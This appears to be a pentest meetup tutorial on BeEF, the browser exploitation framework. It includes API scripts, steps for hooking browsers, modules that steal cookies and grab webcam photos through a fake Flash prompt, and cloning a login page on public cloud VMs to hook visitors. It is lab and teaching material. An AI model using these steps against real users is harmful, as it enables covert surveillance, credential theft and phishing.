.. include:: /pentest_links.txt


*******
`BeEF`_ 
*******

`BeEF`_ is a ruby-based application that "will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context." This source code is available on GitHub at `beefproject/beef <https://github.com/beefproject/beef>`_. For detailed information see the `BeEF wiki`_ and the lead core developer's presentation `All you ever wanted to know about BeEF <http://2012.zeronights.org/includes/docs/Antisnatchor%20-%20All%20you%20ever%20wanted%20to%20know%20about%20BEEF.pdf>`_.


What BeEF does
==============

BeEF architecture
-----------------

To understand BeEF, read `BeEF architecture <https://github.com/beefproject/beef/wiki/Architecture>`_. The communication server runs by default on TCP port 3000:

http://localhost:3000/ui/panel
  BeEF admin web page

http://localhost:3000/demos/basic.html
  Basic demo page to hook victims

http://localhost:3000/demos/butcher/index.html
  Another demo page to hook victims

Getting hooked (becoming a bot)
-------------------------------

Get client to run :program:`hook.js`
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The attacker starts the BeEF communication server and then sets out to entice web browsers to get hooked by running :program:`hook.js` from some web page. A hooked web browser defaults to polling the BeEF communication server every 5 seconds for commands.

Server creates :program:`hook.js` dynamically
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If you look for :program:`hook.js` in the souce code you won't find it; it's dynamically built for each new client based on BeEF configuration options. `beef/core/main/handlers/hookedbrowsers.rb <https://github.com/beefproject/beef/blob/master/core/main/handlers/hookedbrowsers.rb>`_ "handles connections from hooked browsers to the framework" and calls ``build_beefjs!(host_name)`` for unhooked browsers. `beef/core/main/handlers/modules/beefjs.rb <https://github.com/beefproject/beef/blob/master/core/main/handlers/modules/beefjs.rb>`_ contains an ``build_beefjs!(req_host)`` which defines ``hook.js`` as an obfuscated combination of: core/main/client/ modules beef.js browser.js browser/cookie.js browser/popup.js session.js os.js hardware.js dom.js logger.js net.js updater.js encode/base64.js encode/json.js net/local.js init.js mitb.js net/dns.js net/cors.js are.js websocket.js lib/webrtcadapter.js webrtc.js timeout.js.

Exploiting hooked browsers
--------------------------

BeEF modules
^^^^^^^^^^^^

BeEF has both modules and extensions. From `Creating An Extension <https://github.com/beefproject/beef/wiki/Creating-An-Extension>`_:

  As the name implies, extensions serve to "extend" the capabilities of BeEF. Extensions differ slightly from modules. They are a way to add new functionality to the core features of BeEF whereas modules usually have a narrow set of abilities that perform a specific task. This helps prevent feature creep by modularizing new core features. So if you're asking yourself...

  **"I have a new idea, should it be a module or an extension?"**

  Does it change the way BeEF behaves? **Extension**

  Does it change the way zombies behave? **Module**

A module usually consists of a :file:`config.yaml` configuration file, a ruby script :program:`module.rb` to execute on the communication server, and the JavaScript payload :program:`command.js` to execute on the client. Basically, anything you can do from JavaScript in the browser you can do through BeEF. The hooked browser will pull the command from the communication server and return the results. For detailed information about modules see `BeEF wiki Module creation <https://github.com/beefproject/beef/wiki/Module-creation>`_ and the actual `beef/modules/ <https://github.com/beefproject/beef/tree/master/modules>`_ in the `BeEF repository`_.


.. _beef-restful-api:

BeEF admin GUI & RESTful API
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The attacker directs BeEF module commands to be exectued on a hooked client, either via BeEF's Admin GUI (http://localhost:3000/ui/panel) or the `BeEF RESTful API <https://github.com/beefproject/beef/wiki/BeEF-RESTful-API>`_. The API requires a token which is regenerated by the BeEF server every restart. You can either manually look at the log file, or get it via the following:

.. code-block:: bash
  :emphasize-lines: 4-8,11,14

  BEEF_IPP="localhost:3000"
  BEEF_USER=beef
  BEEF_PW=beef
  DATA='{"username":"'"$BEEF_USER"'", "password":"'"$BEEF_PW"'"}'
  RESPONSE=$(curl --silent --request POST \
                 --header "Content-Type: application/json" \
                 --data "$DATA" \
              http://$BEEF_IPP/api/admin/login)
  SUCCESS=${RESPONSE#*\"success\":}
  SUCCESS=${SUCCESS%%,*}
  echo SUCCESS=$SUCCESS
  TOKEN=${RESPONSE#*\"token\":\"}
  TOKEN=${TOKEN%%\"*}
  echo TOKEN=$TOKEN

Running this will return a JSON response which can be parsed for the token:

.. code-block:: none
  :emphasize-lines: 12,16,18

  hacker@kali:~$ BEEF_IPP="localhost:3000"
  hacker@kali:~$ BEEF_USER=beef
  hacker@kali:~$ BEEF_PW=beef
  hacker@kali:~$ DATA='{"username":"'"$BEEF_USER"'", "password":"'"$BEEF_PW"'"}'
  hacker@kali:~$ RESPONSE=$(curl --silent --request POST \
  >                --header "Content-Type: application/json" \
  >                --data "$DATA" \
  >             http://$BEEF_IPP/api/admin/login)
  hacker@kali:~$ SUCCESS=${RESPONSE#*\"success\":}
  hacker@kali:~$ SUCCESS=${SUCCESS%%,*}
  hacker@kali:~$ echo SUCCESS=$SUCCESS
  SUCCESS=true
  hacker@kali:~$ TOKEN=${RESPONSE#*\"token\":\"}
  hacker@kali:~$ TOKEN=${TOKEN%%\"*}
  hacker@kali:~$ echo TOKEN=$TOKEN
  TOKEN=dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
  hacker@kali:~$ echo $RESPONSE
  {"success":true,"token":"dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7"}

Use the $TOKEN for RESTFull API calls:

.. code-block:: bash
  :emphasize-lines: 2,4,6

  BEEF_IPP="localhost:3000"
  TOKEN=dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
  # list hooked-browsers
  curl --silent http://$BEEF_IPP/api/hooks?token=$TOKEN
  # list logs
  curl --silent http://$BEEF_IPP/api/logs?token=$TOKEN

Running this gives:

.. code-block:: console
  :emphasize-lines: 4-5,7-8

  hacker@kali:~$ BEEF_IPP="localhost:3000"
  hacker@kali:~$ TOKEN=dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
  hacker@kali:~$ # list hooked-browsers
  hacker@kali:~$ curl --silent http://$BEEF_IPP/api/hooks?token=$TOKEN
  {"hooked-browsers":{"online":{},"offline":{"0":{"id":1,"session":"VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J","name":null,"version":"UNKNOWN","os":"Linux","platform":"Linux x86_64","ip":"192.168.1.28","domain":"192.168.1.104","port":"3000","page_uri":"http://192.168.1.104:3000/demos/basic.html"}}}}
  hacker@kali:~$ # list logs
  hacker@kali:~$ curl --silent http://$BEEF_IPP/api/logs?token=$TOKEN
  {"logs_count":14,"logs":[{"id":1,"date":"2015-05-07T22:11:44-07:00","event":"User with ip 127.0.0.1 has successfuly authenticated in the application.","type":"Authentication"},{"id":2,"date":"2015-05-07T23:31:44-07:00","event":"User with ip 127.0.0.1 has successfuly logged out.","type":"Authentication"},{"id":3,"date":"2015-05-07T23:35:30-07:00","event":"User with ip 127.0.0.1 has successfuly authenticated in the application.","type":"Authentication"},{"id":4,"date":"2015-05-07T23:40:31-07:00","event":"192.168.1.28 just joined the horde from the domain: 192.168.1.104:3000","type":"Zombie"},{"id":5,"date":"2015-05-07T23:40:31-07:00","event":"192.168.1.28 appears to have come back online","type":"Zombie"},{"id":6,"date":"2015-05-07T23:40:40-07:00","event":"0.009s - [Focus] Browser window has regained focus.","type":"Event"},{"id":7,"date":"2015-05-07T23:40:40-07:00","event":"2.412s - [Blur] Browser window has lost focus.","type":"Event"},{"id":8,"date":"2015-05-07T23:40:45-07:00","event":"7.428s - [Focus] Browser window has regained focus.","type":"Event"},{"id":9,"date":"2015-05-07T23:40:45-07:00","event":"7.505s - [Mouse Click] x: 704 y:401 > html ","type":"Event"},{"id":10,"date":"2015-05-07T23:41:00-07:00","event":"24.461s - [Blur] Browser window has lost focus.","type":"Event"},{"id":11,"date":"2015-05-07T23:43:06-07:00","event":"147.520s - [Focus] Browser window has regained focus.","type":"Event"},{"id":12,"date":"2015-05-07T23:43:06-07:00","event":"147.551s - [Blur] Browser window has lost focus.","type":"Event"},{"id":13,"date":"2015-05-07T23:49:57-07:00","event":"User with ip 127.0.0.1 has successfuly logged out.","type":"Authentication"},{"id":14,"date":"2015-05-08T10:00:06-07:00","event":"User with ip 192.168.1.28 has successfuly authenticated in the application.","type":"Authentication"}]}

Of course json and bash don't mix well. Here go some examples using python2/3:

.. code-block:: python

  # python2 using requests
  python2
  import json
  import requests
  # first get the token
  url_base = "http://localhost:3000"
  data = json.dumps({"username":"beef", "password":"beef"})
  headers = {"Content-type": "application/json", "Accept": "text/json"}
  r = requests.post(url_base + "/api/admin/login", data=data, headers=headers)
  token = {"token": r.json['token']}
  # now get hooked browsers
  r = requests.get(url_base + "/api/hooks", params=token)
  r.json
  exit()

Running this gives:

.. code-block:: pycon
  :emphasize-lines: 17

  hacker@kali:~$ # python2 using requests
  hacker@kali:~$ python2
  Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
  [GCC 4.7.2] on linux2
  Type "help", "copyright", "credits" or "license" for more information.
  >>> import json
  >>> import requests
  >>> # first get the token
  ... url_base = "http://localhost:3000"
  >>> data = json.dumps({"username":"beef", "password":"beef"})
  >>> headers = {"Content-type": "application/json", "Accept": "text/json"}
  >>> r = requests.post(url_base + "/api/admin/login", data=data, headers=headers)
  >>> token = {"token": r.json['token']}
  >>> # now get hooked browsers
  ... r = requests.get(url_base + "/api/hooks", params=token)
  >>> r.json
  {u'hooked-browsers': {u'offline': {u'0': {u'domain': u'192.168.1.104', u'version': u'UNKNOWN', u'ip': u'192.168.1.28', u'port': u'3000', u'platform': u'Linux x86_64', u'session': u'VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J', u'page_uri': u'http://192.168.1.104:3000/demos/basic.html', u'os': u'Linux', u'id': 1, u'name': None}}, u'online': {u'0': {u'domain': u'192.168.1.104', u'version': u'UNKNOWN', u'ip': u'192.168.1.28', u'port': u'3000', u'platform': u'Linux x86_64', u'session': u'1kOFWialLh8VOvwmu9DO6EDrw7aXwE0GC77furHwAEGi7u0P96uMXgdfKf5h58sCru4dzRqYjkKx6sgn', u'page_uri': u'http://192.168.1.104:3000/demos/basic.html', u'os': u'Linux', u'id': 2, u'name': None}}}}
  >>> exit()

And in python3:

.. code-block:: python3

  # python3 w/o requests
  python3
  import json
  import urllib.parse
  import urllib.request
  url_base = "http://localhost:3000"
  data = json.dumps({"username":"beef", "password":"beef"}).encode('utf8')
  headers = {"Content-type": "application/json", "Accept": "text/json"}
  req = urllib.request.Request(url_base + "/api/admin/login", data=data, headers=headers)
  response = urllib.request.urlopen(req)
  answer = json.loads(response.read().decode('utf8'))
  token = answer['token']
  # now get hooked browsers
  req = urllib.request.Request(url_base + "/api/hooks?" +
      urllib.parse.urlencode({"token": token}))
  response = urllib.request.urlopen(req)
  answer = json.loads(response.read().decode('utf8'))
  answer
  exit()

Running this gives:

.. code-block:: pycon
  :emphasize-lines: 22

  hacker@kali:~$ # python3 w/o requests
  hacker@kali:~$ python3
  Python 3.2.3 (default, Feb 20 2013, 14:44:27) 
  [GCC 4.7.2] on linux2
  Type "help", "copyright", "credits" or "license" for more information.
  >>> import json
  >>> import urllib.parse
  >>> import urllib.request
  >>> url_base = "http://localhost:3000"
  >>> data = json.dumps({"username":"beef", "password":"beef"}).encode('utf8')
  >>> headers = {"Content-type": "application/json", "Accept": "text/json"}
  >>> req = urllib.request.Request(url_base + "/api/admin/login", data=data, headers=headers)
  >>> response = urllib.request.urlopen(req)
  >>> answer = json.loads(response.read().decode('utf8'))
  >>> token = answer['token']
  >>> # now get hooked browsers
  ... req = urllib.request.Request(url_base + "/api/hooks?" +
  ...     urllib.parse.urlencode({"token": token}))
  >>> response = urllib.request.urlopen(req)
  >>> answer = json.loads(response.read().decode('utf8'))
  >>> answer
  {'hooked-browsers': {'offline': {'0': {'domain': '192.168.1.104', 'version': 'UNKNOWN', 'ip': '192.168.1.28', 'port': '3000', 'platform': 'Linux x86_64', 'session': 'VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J', 'page_uri': 'http://192.168.1.104:3000/demos/basic.html', 'os': 'Linux', 'id': 1, 'name': None}}, 'online': {'0': {'domain': '192.168.1.104', 'version': 'UNKNOWN', 'ip': '192.168.1.28', 'port': '3000', 'platform': 'Linux x86_64', 'session': '1kOFWialLh8VOvwmu9DO6EDrw7aXwE0GC77furHwAEGi7u0P96uMXgdfKf5h58sCru4dzRqYjkKx6sgn', 'page_uri': 'http://192.168.1.104:3000/demos/basic.html', 'os': 'Linux', 'id': 2, 'name': None}}}}
  >>> exit()


Setting up BeEF in Kali
=======================

Installation
------------

On Kali Linux, the package ``beef-xss`` must be installed and the service :program:`beef-xss` started (to run the beef communication server):

.. code-block:: bash
  :emphasize-lines: 3-4

  SUDO=$(which sudo)
  [[ "$USER" == "root" ]] && SUDO=
  # install required packages
  $SUDO apt-get install beef-xss -y

On non-Kali hosts follow `BeEF Wiki Installation <https://github.com/beefproject/beef/wiki/Installation>`_.

BeEF configuration
------------------

See `BeEF Wiki Configuration <https://github.com/beefproject/beef/wiki/Configuration>`_ for a quick introduction to configuring BeEF. The main BeEF configuration file :file:`/etc/beef-xss/config.yaml` defines the web server port as 3000 with user/password defaults of "beef/beef". To get a more complete list of BeEF configuration files and search them for particular parameters:

.. code-block:: bash
  :emphasize-lines: 7-

  # install apt-file if not already installed
  SUDO=$(which sudo)
  [[ "$USER" == "root" ]] && SUDO=
  # install required packages
  $SUDO apt-get install apt-file
  $SUDO apt-file update
  # on Kali 1.0.9a the following lists 217 config.yaml filenames
  apt-file find config.yaml | grep 'beef-xss' | cut -f2 -d:
  # to search for "port:" in a configuration file
  apt-file find config.yaml | grep 'beef-xss' | cut -f2 -d: | \
      xargs -n1 grep -iH 'port:'
  # or save config filenames into a file and use that for grep input
  apt-file find config.yaml | grep 'beef-xss' | cut -f2 -d: > files.txt
  xargs -a files.txt  -n1 grep -iH 'port:'

Obviously for a real BeEF deployment all default passwords should be changed with a different web server configuration. But for demo/play purposes the defaults (outside the beef/beef userid/password) are OK on a private network.


Running BeEF
============

Starting the services
---------------------

Start the :program:`beef-xss` service from the command line. The service runs as the unprivileged user beef-xss and therefore cannot access privileged ports. The Admin GUI then runs at http://localhost:3000/ui/panel/ and the sample exploit pages run at http://localhost:3000/demos/basic.html and http://localhost:3000/demos/butcher/index.html.

.. code-block:: bash
  :emphasize-lines: 6,11

  SUDO=$(which sudo)
  [[ "$USER" == "root" ]] && SUDO=
  # start BeEF communication server prior to exploits
  #   ss to check server listening ports
  $SUDO ss -tnlp
  $SUDO service beef-xss start
  sleep 10
  $SUDO ss -tnlp

  # when done stop the server
  $SUDO service beef-xss stop


Hook browsers
-------------

The idea is to get the target browser to execute a page containing :program:`hook.js`, which is quite large (here 7039 lines containing 344,428 tighly-packed bytes):

.. code-block:: bash

  curl --silent --remote-name http://localhost:3000/hook.js
  wc hook.js

Running this gives:

.. code-block:: console
  :emphasize-lines: 3

  hacker@kali:~$ curl --silent --remote-name http://localhost:3000/hook.js
  hacker@kali:~$ wc hook.js
  7039  25619 344248 hook.js

There are 2 sample pages where browsers can get hooked: http://$HOSTIP:3000/demos/basic.html and http://$HOSTIP:3000/demos/butcher/index.html:

.. code-block:: bash

  curl --silent http://localhost:3000/demos/basic.html | grep hook
  curl --silent http://localhost:3000/demos/butcher/index.html | grep hook

Running this gives:

.. code-block:: console
  :emphasize-lines: 2-3,5

  hacker@kali:~$ curl --silent http://localhost:3000/demos/basic.html | grep hook
		  var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';
	  You should be hooked into <b>BeEF</b>.
  hacker@kali:~$ curl --silent http://localhost:3000/demos/butcher/index.html | grep hook
	  var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';

You can get another meetup participant to browse to your web server or hook your own browser using either :program:`iceweasel`, :program:`chrome`, or any other installed browser with JavaScript enabled.

Exploiting hooked browsers
--------------------------

The hooked browser will continually poll the BeEF communication server. The BeEF control panel http://localhost:3000/ui/panel can be used to apply commands from a variety of modules. Let's assume a remote client was hooked by visiting http://$HOSTIP:3000/demos/basic.html. Try these basic modules:

* In the BeEF control panel browse to the hooked browser under :guilabel:`Online Browsers` and select :menuselection:`Commands --> Browser --> Hooked Domain --> Get Cookie`; then under :guilabel:`Get Cookie` :kbd:`click` :guilabel:`Execute`; then under :guilabel:`Module Results History` and :kbd:`click` the last command id. You should see the under :guilabel:`Command results` the cookies on the hooked browser tab ("BEEFHOOK" in for this web page).

* Apply command :guilabel:`Replace HREFS`, which will rewrite the URL's on the hooked browser's page to the URL you specify in the :guilabel:`Replace HREFS` :guilabel:`Execute` page. Run the command to replace every link on the hooked browser to https://www.google.com/ and verify that the hooked browser links now all actually HREF https://www.google.com/.

* For a final test, under :guilabel:`Online Browsers` select the hooked browser, then select :menuselection:`Commands --> Browser --> Hooked Domain --> Webcam` :kbd:`click` :guilabel:`Execute`. Of course the client must have an accessible webcam (which can be checked with the :guilabel:`Webcam Permission Check` module). The hooked browser should display a message "This website is using Adobe Flash ..." with an "Adobe Flash Player Settings" popup requesting :guilabel:`Allow` access to camera and microphone. After acceptance a series of 20 photos are taken at a 1 second interval (unless you changed the defaults). When the command shows the :guilabel:`Ready` status (far lower left of window), in :guilabel:`Module Results History` :kbd:`click` the last command id. You should see the base64 encoded image data displayed in the :guilabel:`Webcam` panel. The images are large and hard to individually select from the panel. We found it easier to :kbd:`right-click` :kbd:`Select All` and paste it into an fast editor and save the file as :file:`select_all.txt`. Then get the images by:

  .. code-block:: bash

    INPUT=select_all.txt
    IMAGE=image_
    rm -rf ${IMAGE}[0-9][0-9]
    sed -ne '/^data: image=/{s/^data: image=//p}' $INPUT | \
      split -d -l 1 - $IMAGE
    for i in ${IMAGE}[0-9][0-9]; do
      base64 -d $i > $i.jpg
    done
    rm -rf ${IMAGE}[0-9][0-9]

The webcam images are visible as :file:`image_[0-9][0-9].jpg`.

If the above is too clumsy to do, you can use :program:`sqlite3` on the BeEF database to get the images. Although not recommended, it also gets you familiar with the database behind BeEF. Here we find the images for the hooked browser at 192.168.1.103, which has browser id 6 and only one command with id 17:

.. code-block:: sql

  sqlite3 /usr/share/beef-xss/db/beef.db
  .databases
  .tables
  .schema core_hookedbrowsers
  .schema core_results
  select id from core_hookedbrowsers where ip = "192.168.1.103";
  select distinct command_id from core_results where hooked_browser_id = 6;
  .output log.txt
  select data from core_results where hooked_browser_id  = 6 and command_id = 17;

Then process :file:`log.txt` to get the images:

.. code-block:: bash

    INPUT=log.txt
    IMAGE=image-
    rm -rf ${IMAGE}[0-9][0-9]
    sed -ne '/^{"data":"image=/{s/^{"data":"image=//;s/"}//;p}' $INPUT | \
      split -d -l 1 - $IMAGE
    for i in ${IMAGE}[0-9][0-9]; do
      base64 -d $i > $i.jpg
    done
    rm -rf ${IMAGE}[0-9][0-9]

The webcam images are visible as :file:`image-[0-9][0-9].jpg`.

More exploiting hooked browsers
-------------------------------

Consult the `BeEF wiki`_ for more examples: `BeEF wiki social engineering <https://github.com/beefproject/beef/wiki/Social-Engineering>`_ and `BeEF wiki metasploit <https://github.com/beefproject/beef/wiki/Metasploit>`_ are good starts.


Stopping the services
---------------------

.. code-block:: bash
  :emphasize-lines: 4

  SUDO=$(which sudo)
  [[ "$USER" == "root" ]] && SUDO=
  # stop BeEF communication server prior to exploits
  $SUDO service beef-xss stop


DigitalOcean BeEF clone_page example
====================================

From `BeEF web cloning, BeEF mass mailing, Social Engineering with better BeEF! <http://blog.beefproject.com/2012/09/beef-web-cloning-beef-mass-mailing.html>`_:

  Both the web cloner and the mass mailer functionality are currently exposed only via the RESTful API. To clone https://example.com/login.aspx and mount it on /login.aspx on BeEF, use the following curl request:(update [BeEF]; and [token]; accordingly):

  .. code-block:: bash

    curl -H "Content-Type: application/json; charset=UTF-8" -d
     '{"url":"https://example.com/login.aspx", "mount":"/login.aspx"}' 
     -X POST http://[BeEF]/api/seng/clone_page?token=[token];

This example shows how to use the web cloner on a DigitalOcean Debian 8 VM (droplet) running BeEF. The Debian package :program:`authbind` is used to allow BeEF to listen on privileged port 443.


Server setup
------------

Assume a DigitalOcean droplet: size 512 MB, Debian 8 x64 image, with :file:`~/.ssh/keys/id_do_rsa` for passwordless access to the droplet (or type in passwords below). First start by connecting as root to the VM:

.. code-block:: bash

  # set to BeEF server IP and remove any known_hosts of same IP
  VM=162.243.153.78
  ssh-keygen -f "$HOME/.ssh/known_hosts" -R $VM
  # will use ssh keys for passwordless access to VM
  ssh-add ~/.ssh/keys/id_do_rsa
  ssh root@$VM

At the BeEF VM as root create & ``su`` to normal user for BeEF setup:

.. code-block:: bash
  :emphasize-lines: 13-20,22-24,25-65

  VM=162.243.153.78
  # create a non-root user to "su"
  RU=hacker
  apt-get install sudo -y
  useradd -m $RU
  passwd $RU
  # enter password twice
  usermod -a -G sudo $RU
  chsh -s /bin/bash $RU
  # userdel -r $RU

  # switch to normal user
  su - $RU
  FQDN="pentest-meetup.do.bitbender.org"
  VM=162.243.153.78
  HTTP=https
  RU=hacker
  BEEF_IPP="$VM"
  BEEF_USER="lethal"
  BEEF_PW="beef-test"

  # BeEF VM setup
  SUDO="$(which sudo)"
  [[ "$USER" == "root" ]] && SUDO=
  $SUDO date
  $SUDO apt-get update
  $SUDO apt-get remove rpcbind -y
  $SUDO apt-get autoremove -y
  $SUDO apt-get install curl git -y
  $SUDO apt-get install authbind -y
  # let $RU access ports 80, 443
  $SUDO touch /etc/authbind/byport/80
  $SUDO chgrp $RU /etc/authbind/byport/80
  $SUDO chmod 770 /etc/authbind/byport/80
  $SUDO touch /etc/authbind/byport/443
  $SUDO chgrp $RU /etc/authbind/byport/443
  $SUDO chmod 770 /etc/authbind/byport/443

  # install, setup BeEF
  $SUDO apt-get install gnupg2 -y
  gpg2 --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
  curl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer \
      | bash -s stable
  source ~/.rvm/scripts/rvm
  rvm install 2.1.5
  rvm use 2.1.5 -- default
  gem install bundler
  git clone git://github.com/beefproject/beef.git
  cd beef
  # edit config.yaml to change
  #   beef:http:host from "0.0.0.0" to "$FQDN"
  #   beef:http:port from "3000" to "443"
  #   userid/password from beef/beef to lethal/beef-test
  #   https: enable: true
  mv config.yaml config.yaml.orig
  cp config.yaml.orig config.yaml
  sed -i -e 's/host: "0.0.0.0"/host: "'$FQDN'"/'  config.yaml
  sed -i -e 's/port: "3000"/port: "'443'"/'  config.yaml
  sed -i -e 's/user:   "beef"/user:   "'"$BEEF_USER"'"/'  config.yaml
  sed -i -e 's/passwd: "beef"/passwd: "'"$BEEF_PW"'"/'  config.yaml
  [[ "$HTTP" == "https" ]] && sed -i -e '/https:/{n;s/false/true/}' config.yaml
  bundle install
  nohup authbind ruby beef &
  # when done, stop BeEF via
  #   kill -INT $(ps -C ruby -o pid=)

Clone_page
----------

Continue on from the session above to clone https://pentest-meetup.appspot.com/html/index.html:

.. code-block:: bash
  :emphasize-lines: 1-11,14,17,19-22

  BEEF_IPP="$FQDN"
  BEEF_USER="lethal"
  BEEF_PW="beef-test"
  HTTP=https
  # clone_page https://pentest-meetup.appspot.com/html/index.html
  #   first get the API token needed for authentication
  DATA='{"username":"'"$BEEF_USER"'", "password":"'"$BEEF_PW"'"}'
  RESPONSE=$(curl --silent --insecure --request POST \
                 --header "Content-Type: application/json" \
                 --data "$DATA" \
              $HTTP://$BEEF_IPP/api/admin/login)
  SUCCESS=${RESPONSE#*\"success\":}
  SUCCESS=${SUCCESS%%,*}
  echo SUCCESS=$SUCCESS
  TOKEN=${RESPONSE#*\"token\":\"}
  TOKEN=${TOKEN%%\"*}
  echo TOKEN=$TOKEN

  #   now use the token to clone_page
  curl --insecure --header "Content-Type: application/json; charset=UTF-8"  \
       --data '{"url":"https://pentest-meetup.appspot.com/html/index.html", "mount":"/html/index.html"}' \
       --request POST $HTTP://$BEEF_IPP/api/seng/clone_page?token=$TOKEN

At this point the web page has been cloned on the BeEF server and you can open the web page $HTTP://$FQDN/html/index.html to get hooked.

.. code-block:: bash

  curl --silent --insecure https://$FQDN/html/index.html | grep hook.js


Google Compute Engine BeEF clone_page example
=============================================

External vs internal IP
-----------------------

Here is the Google Compute Engine (GCE) version of the DigitalOcean clone_page example. This illustrates setting up BeEF behind a NAT'ed server: DigitalOcean's sole network interface uses the VM's external IP (simplifying the setup), whereas GCE's sole network interface uses the VM's internal IP address. For configuration this means for DigitalOcean's :file:`config.yaml` uses:

.. code-block:: yaml

  beef:
       http:
           host: "EXTERNAL_IP_OR_FQDN"
           port: "EXTERNAL_PORT"

But GCE needs to handle the NAT so :file:`config.yaml` uses:

.. code-block:: yaml

  beef:
       http:
           host: "INTERNAL_IP_OR_FQDN"
           port: "INTERNAL_PORT"
           public: "EXTERNAL_IP_OR_FQDN"
           public_port: "EXTERNAL_PORT"

Complicating this is the fact that currently BeEF's `web_clone.rb <https://github.com/beefproject/beef/blob/master/extensions/social_engineering/web_cloner/web_cloner.rb>`_ has a bug in generating the <script> tag for :program:`hook.js` in that it uses ``beef:http:host`` and ``beef:http:port``; for GCE this is the non-routable internal IP which cannot be access by the victim making it impossible to hook any client. Here's the `web_clone.rb <https://github.com/beefproject/beef/blob/master/extensions/social_engineering/web_cloner/web_cloner.rb>`_ before code:

.. code-block:: ruby

  beef_proto = @config.get("beef.http.https.enable") == true ? "https" : "http"
  @beef_hook = "#{beef_proto}://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"

and while this is not an official fix, this code makes GCE work:

.. code-block:: ruby

  beef_proto = @config.get("beef.http.https.enable") == true ? "https" : "http"
  beef_host = @config.get("beef.http.public") != nil ? @config.get("beef.http.public") : @config.get('beef.http.host')
  beef_port = @config.get("beef.http.public_port") != nil ? @config.get("beef.http.public_port") : @config.get('beef.http.port')
  @beef_hook = "#{beef_proto}://#{beef_host}:#{beef_port}#{@config.get('beef.http.hook_file')}"

To generate a patch file for application later we run:

.. code-block:: bash

  git diff extensions/social_engineering/web_cloner/web_cloner.rb > patch.diff
  # Later apply patch via:
  #  git apply patch.diff

The actual patch is:

.. code-block:: diff

  diff --git a/extensions/social_engineering/web_cloner/web_cloner.rb b/extensions/social_engineering/web_cloner/web_cloner.rb
  index 5ef7083..d0f9203 100644
  --- a/extensions/social_engineering/web_cloner/web_cloner.rb
  +++ b/extensions/social_engineering/web_cloner/web_cloner.rb
  @@ -15,7 +15,9 @@ module BeEF
             @config = BeEF::Core::Configuration.instance
             @cloned_pages_dir = "#{File.expand_path('../../../../extensions/social_engineering/web_cloner', __FILE__)}/cloned_pages/"
             beef_proto = @config.get("beef.http.https.enable") == true ? "https" : "http"
  -          @beef_hook = "#{beef_proto}://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
  +          beef_host = @config.get("beef.http.public") != nil ? @config.get("beef.http.public") : @config.get('beef.http.host')
  +          beef_port = @config.get("beef.http.public_port") != nil ? @config.get("beef.http.public_port") : @config.get('beef.http.port')
  +          @beef_hook = "#{beef_proto}://#{beef_host}:#{beef_port}#{@config.get('beef.http.hook_file')}"
           end
   
           def clone_page(url, mount, use_existing, dns_spoof)

Server setup
------------

Here is the command-line level for setting up a GCE BeEF instance. We'll leave out the details of setting up a GCE account, installing `Google Cloud SDK <https://cloud.google.com/sdk/>`_, setting up DNS (you could hack your /etc/hosts file), ... .

.. code-block:: bash

  # *******************************
  # *******************************
  # Exploiter host steps
  #   Create GCE instance
  #   ssh to instance
  # *******************************
  # *******************************

  # Google-isms
  PROJECT="bitbender.org:bitbender"
  ZONE="us-central1-c"
  MACHINE="f1-micro"
  IMAGE="https://www.googleapis.com/compute/v1/projects/debian-cloud/global/images/backports-debian-7-wheezy-v20150423"
  INSTANCE="pentest-meetup"
  TAG=beef
  # Use this DNS name (put in DNS or /etc/hosts on remote machines)
  DOMAIN="gce.bitbender.org"
  FQDN="$INSTANCE.$DOMAIN"
  # Create SSH key (or use existing one)
  VMUSER=hacker
  EMAIL="hacker@$DOMAIN"
  SSH_PRIV_FILE="$HOME/.ssh/id_rsa_gce"
  SSH_PUB_FILE="$SSH_PRIV_FILE.pub"
  # enter a password
  ssh-keygen -t rsa -b 4096 -C "$EMAIL" -f $SSH_PRIV_FILE
  SSH_PUB_KEY="$(cat $SSH_PUB_FILE)"

  # Set project and zone
  gcloud config set project $PROJECT
  gcloud config set compute/zone $ZONE

  # See existing instances
  gcloud compute instances list

  # Add beef firewall tag
  # NOTE: more ports needed as more BeEF ports used
  gcloud compute firewall-rules list
  gcloud compute firewall-rules delete beef-local --quiet
  gcloud compute firewall-rules create beef-local --network default \
      --allow udp:5300,tcp:6789 --source-ranges 127.0.0.1 --target-tags $TAG
  gcloud compute firewall-rules delete beef-external --quiet
  gcloud compute firewall-rules create beef-external --network default \
      --allow udp:5300,tcp:80,tcp:443,tcp:2000,tcp:3000 --target-tags $TAG
  gcloud compute firewall-rules list

  # Create instance using beef firewall tag
  gcloud compute --project "$PROJECT" \
      instances create "$INSTANCE" \
      --zone "$ZONE" --machine-type "$MACHINE" --network "default" \
      --maintenance-policy "MIGRATE" \
      --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write \
      --tags=$TAG \
      --image "$IMAGE" \
      --boot-disk-type "pd-standard" \
      --boot-disk-device-name "$INSTANCE" \
      --metadata "sshKeys=$VMUSER:$SSH_PUB_KEY"

  # Wait for it to start then get external and internal IPs
  gcloud compute instances list

  # Here goes the external and internal IPs
